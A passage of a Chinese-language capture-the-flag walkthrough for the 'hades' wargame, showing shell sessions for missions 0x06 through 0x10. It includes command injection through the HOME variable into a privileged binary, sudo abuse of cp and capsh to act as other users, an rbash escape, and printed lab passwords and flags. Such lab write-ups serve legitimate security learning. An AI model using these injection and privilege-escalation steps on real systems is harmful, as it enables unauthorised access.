./flagz.txt:^AcFLuAjhydNKIkPoFLL^
anthea@hades:~$ cat mission.txt 
################
# MISSION 0x06 #
################

## EN ##
User aphrodite is obsessed with the number 94.

## ES ##
La usuaria aphrodite esta obsesionada con el numero 94.
anthea@hades:~$ ./obsessed 
No MYID ENV
anthea@hades:~$ env
SHELL=/bin/bash
PWD=/pwned/anthea
LOGNAME=anthea
MOTD_SHOWN=pam
HOME=/pwned/anthea
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.
tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=0
1;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31
:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:*
.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;3
5:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=0
1;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:
*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*
.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.swp=00;90:*.tmp=00;90:*.dpkg-dist=00;90:*.dpkg-old=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:
SSH_CONNECTION=127.0.0.1 45418 127.0.0.1 22
TERM=xterm-256color
USER=anthea
SHLVL=1
SSH_CLIENT=127.0.0.1 45418 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
SSH_TTY=/dev/pts/4
_=/usr/bin/env
anthea@hades:~$ export MYID=94 
anthea@hades:~$ ./obsessed 
Current MYID: 57
Incorrect MYID
anthea@hades:~$ export MYID=57
anthea@hades:~$ ./obsessed
Current MYID: 53
Incorrect MYID
anthea@hades:~$ export MYID=$(./obsessed)
anthea@hades:~$ ./obsessed
Current MYID: 67
Incorrect MYID
anthea@hades:~$ whoami;id
anthea
uid=2047(anthea) gid=2047(anthea) groups=2047(anthea)
anthea@hades:~$ export MYID=94
anthea@hades:~$ ./obsessed 
Current MYID: 57
Incorrect MYID
anthea@hades:~$ export MYID=57
anthea@hades:~$ ./obsessed
Current MYID: 53
Incorrect MYID
anthea@hades:~$ export MYID=53
anthea@hades:~$ ./obsessed
Current MYID: 53
Incorrect MYID
```
后面看[群主视频](https://www.bilibili.com/video/BV1Wy421h7HV/?spm_id_from=333.788&vd_source=8981ead94b755f367ac539f6ccd37f77)发现这和ascii码有关，嘶。。。。
```bash
hgbe02@pwn:~/temp$ ascii
Usage: ascii [-adxohv] [-t] [char-alias...]
   -t = one-line output  -a = vertical format
   -d = Decimal table  -o = octal table  -x = hex table  -b binary table
   -h = This help screen -v = version information
Prints all aliases of an ASCII character. Args may be chars, C \-escapes,
English names, ^-escapes, ASCII mnemonics, or numerics in decimal/octal/hex.

Dec Hex    Dec Hex    Dec Hex  Dec Hex  Dec Hex  Dec Hex   Dec Hex   Dec Hex  
  0 00 NUL  16 10 DLE  32 20    48 30 0  64 40 @  80 50 P   96 60 `  112 70 p
  1 01 SOH  17 11 DC1  33 21 !  49 31 1  65 41 A  81 51 Q   97 61 a  113 71 q
  2 02 STX  18 12 DC2  34 22 "  50 32 2  66 42 B  82 52 R   98 62 b  114 72 r
  3 03 ETX  19 13 DC3  35 23 #  51 33 3  67 43 C  83 53 S   99 63 c  115 73 s
  4 04 EOT  20 14 DC4  36 24 $  52 34 4  68 44 D  84 54 T  100 64 d  116 74 t
  5 05 ENQ  21 15 NAK  37 25 %  53 35 5  69 45 E  85 55 U  101 65 e  117 75 u
  6 06 ACK  22 16 SYN  38 26 &  54 36 6  70 46 F  86 56 V  102 66 f  118 76 v
  7 07 BEL  23 17 ETB  39 27 '  55 37 7  71 47 G  87 57 W  103 67 g  119 77 w
  8 08 BS   24 18 CAN  40 28 (  56 38 8  72 48 H  88 58 X  104 68 h  120 78 x
  9 09 HT   25 19 EM   41 29 )  57 39 9  73 49 I  89 59 Y  105 69 i  121 79 y
 10 0A LF   26 1A SUB  42 2A *  58 3A :  74 4A J  90 5A Z  106 6A j  122 7A z
 11 0B VT   27 1B ESC  43 2B +  59 3B ;  75 4B K  91 5B [  107 6B k  123 7B {
 12 0C FF   28 1C FS   44 2C ,  60 3C <  76 4C L  92 5C \  108 6C l  124 7C |
 13 0D CR   29 1D GS   45 2D -  61 3D =  77 4D M  93 5D ]  109 6D m  125 7D }
 14 0E SO   30 1E RS   46 2E .  62 3E >  78 4E N  94 5E ^  110 6E n  126 7E ~
 15 0F SI   31 1F US   47 2F /  63 3F ?  79 4F O  95 5F _  111 6F o  127 7F DEL
```
所以发现了吗？

> 53  ==>  5  ==>  57
> 57  ==>  9  ==>  94
> 它只读了第一位，这样我们就可以进行验证一下：

```bash
anthea@hades:~$ export MYID=1;./obsessed 
Current MYID: 49
Incorrect MYID
anthea@hades:~$ export MYID=2;./obsessed
Current MYID: 50
Incorrect MYID
anthea@hades:~$ export MYID=11;./obsessed
Current MYID: 49
Incorrect MYID
anthea@hades:~$ export MYID=22;./obsessed
Current MYID: 50
Incorrect MYID
```

所以我们找到对应94的ascii即可；
```bash
anthea@hades:~$ export MYID=^;./obsessed 
Current MYID: 94
aphrodite@hades:~$ cat aphrodite_pass.txt 
HPJVaqRzieKQeyyATsFv
```

## 7 aphrodite
```bash
aphrodite@hades:~$ ls -la
total 52
drwxr-x--- 2 root      aphrodite  4096 Apr  5 06:36 .
drwxr-xr-x 1 root      root       4096 Apr  5 06:36 ..
-rw-r--r-- 1 aphrodite aphrodite   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 aphrodite aphrodite  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 aphrodite aphrodite   807 Apr 23  2023 .profile
-r--r----- 1 ariadne   ariadne      21 Apr  5 06:36 ariadne_pass.txt
-rw-r----- 1 root      aphrodite    22 Apr  5 06:36 flagz.txt
-rwS--s--- 1 root      aphrodite 16216 Apr  5 06:36 homecontent
-rw-r----- 1 root      aphrodite   185 Apr  5 06:36 mission.txt
aphrodite@hades:~$ grep -ra '\^*\^' .
grep: ./ariadne_pass.txt: Permission denied
./flagz.txt:^fmPlsDByrwmEpRAKgeP^
grep: ./homecontent: Permission denied
aphrodite@hades:~$ cat mission.txt 
################
# MISSION 0x07 #
################

## EN ##
The user ariadne knows what we keep in our HOME.

## ES ##
La usuaria ariadne sabe que es lo que guardamos en nuestro HOME.
aphrodite@hades:~$ ./homecontent 
The content of your HOME is:
ariadne_pass.txt  flagz.txt  homecontent  mission.txt
aphrodite@hades:~$ echo $HOME
/pwned/aphrodite
aphrodite@hades:~$ HOME='/;whoami';./homecontent 
The content of your HOME is:
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  pazz  proc  pwned  root  run  sbin  srv  sys  tmp  usr  var  www
ariadne
aphrodite@hades:/pwned/aphrodite$ HOME='/pwned/aphrodite;/bin/bash';./homecontent 
The content of your HOME is:
ariadne_pass.txt  flagz.txt  homecontent  mission.txt
ariadne@hades:/pwned/aphrodite$ whoami;id;cat ariadne_pass.txt 
ariadne
uid=2049(ariadne) gid=2048(aphrodite) groups=2048(aphrodite)
iNgNazuJrmhJKWixktzk
```

## 8 ariadne
```bash
ariadne@hades:~$ ls -la
total 32
drwxr-x--- 2 root    ariadne 4096 Apr  5 06:36 .
drwxr-xr-x 1 root    root    4096 Apr  5 06:36 ..
-rw-r--r-- 1 ariadne ariadne  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 ariadne ariadne 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 ariadne ariadne  807 Apr 23  2023 .profile
-rw-r----- 1 root    ariadne   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root    ariadne  165 Apr  5 06:36 mission.txt
ariadne@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^FuGFaFNhtKNxUInxAtd^
ariadne@hades:~$ cat mission.txt 
################
# MISSION 0x08 #
################

## EN ##
The user arete lets us use cp on her behalf.

## ES ##
La usuaria arete nos deja usar cp en su nombre.

ariadne@hades:~$ whereis cp
cp: /usr/bin/cp /usr/share/man/man1/cp.1.gz
ariadne@hades:~$ ls -la /usr/bin/cp
-rwxr-xr-x 1 root root 151152 Sep 20  2022 /usr/bin/cp
ariadne@hades:~$ sudo -l
Matching Defaults entries for ariadne on hades:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ariadne may run the following commands on hades:
    (arete) NOPASSWD: /bin/cp
ariadne@hades:~$ sudo -u arete /bin/cp /pwned/arete/arete_pass.txt /dev/stdout 2>/dev/null
/bin/cp: cannot stat '/pwned/arete/arete_pass.txt': No such file or directory
ariadne@hades:~$ sudo -u arete /bin/cp /pwned/arete/flagz.txt /dev/stdout 2>/dev/null
^qmrrbGUXLTqLFDyCDlx^
```
然后提交flag获取密码：**08: arete/QjrIovHacmGWxVjXRLmA**

## 9 arete
```bash
arete@hades:~$ ls -la
total 32
drwxr-x--- 2 root  arete 4096 Apr  5 06:36 .
drwxr-xr-x 1 root  root  4096 Apr  5 06:36 ..
-rw-r--r-- 1 arete arete  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 arete arete 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 arete arete  807 Apr 23  2023 .profile
-rw-r----- 1 root  arete   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root  arete  227 Apr  5 06:36 mission.txt
arete@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^qmrrbGUXLTqLFDyCDlx^
arete@hades:~$ cat mission.txt 
################
# MISSION 0x09 #
################

## EN ##
The user artemis allows us to use some binary on her behalf. Its a gift... 

## ES ##
La usuaria artemis nos permite usar algun binario en su nombre. Es un regalo...
arete@hades:~$ sudo -l
Matching Defaults entries for arete on hades:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User arete may run the following commands on hades:
    (artemis) NOPASSWD: /sbin/capsh
```

> 参考 https://gtfobins.github.io/gtfobins/capsh/#shell
>
> It can be used to break out from restricted environments by spawning an interactive system shell.
>
> capsh --

```bash
arete@hades:~$ sudo -u artemis /sbin/capsh --
artemis@hades:/pwned/arete$ whoami;id
artemis
uid=2051(artemis) gid=2051(artemis) groups=2051(artemis)
artemis@hades:/pwned/arete$ cd ~
artemis@hades:~$ ls -la 
total 48
drwxr-x--- 2 root    artemis  4096 Apr  5 06:36 .
drwxr-xr-x 1 root    root     4096 Apr  5 06:36 ..
-rw-r--r-- 1 artemis artemis   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 artemis artemis  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 artemis artemis   807 Apr 23  2023 .profile
-rw-r----- 1 root    artemis    22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root    artemis   202 Apr  5 06:36 mission.txt
-rw---x--- 1 root    artemis 16056 Apr  5 06:36 restricted
```

## 10 artemis
```bash
artemis@hades:~$ ls -la
total 48
drwxr-x--- 2 root    artemis  4096 Apr  5 06:36 .
drwxr-xr-x 1 root    root     4096 Apr  5 06:36 ..
-rw-r--r-- 1 artemis artemis   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 artemis artemis  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 artemis artemis   807 Apr 23  2023 .profile
-rw-r----- 1 root    artemis    22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root    artemis   202 Apr  5 06:36 mission.txt
-rw---x--- 1 root    artemis 16056 Apr  5 06:36 restricted
artemis@hades:~$ grep -ra '\^*\^' .
grep: ./restricted: Permission denied
./flagz.txt:^SegGdzPgnNdGAmKjnsa^
artemis@hades:~$ cat mission.txt 
################
# MISSION 0x10 #
################

## EN ##
We need /bin/bash so that the user asia gives us her password.

## ES ##
Necesitamos /bin/bash para que la usuaria asia nos de su password.
artemis@hades:~$ ./restricted 
Your SHELL is: /bin/rbash

djqWtkLisbQlrGtLYHCv
```
嘶，啥情况，难道是没有ssh连接的原因？试试：
09: artemis/HIiaojeORLaJBVSPDDCZ

```bash
artemis@hades:~$ ls -la
total 48
drwxr-x--- 2 root    artemis  4096 Apr  5 06:36 .
drwxr-xr-x 1 root    root     4096 Apr  5 06:36 ..
-rw-r--r-- 1 artemis artemis   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 artemis artemis  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 artemis artemis   807 Apr 23  2023 .profile
-rw-r----- 1 root    artemis    22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root    artemis   202 Apr  5 06:36 mission.txt
-rw---x--- 1 root    artemis 16056 Apr  5 06:36 restricted
artemis@hades:~$ ./restricted 
-rbash: ./restricted: restricted: cannot specify `/' in command names
artemis@hades:~$ bash
artemis@hades:~$ ./restricted 
Your SHELL is: /bin/rbash

djqWtkLisbQlrGtLYHCv
```
啊这。。。。。
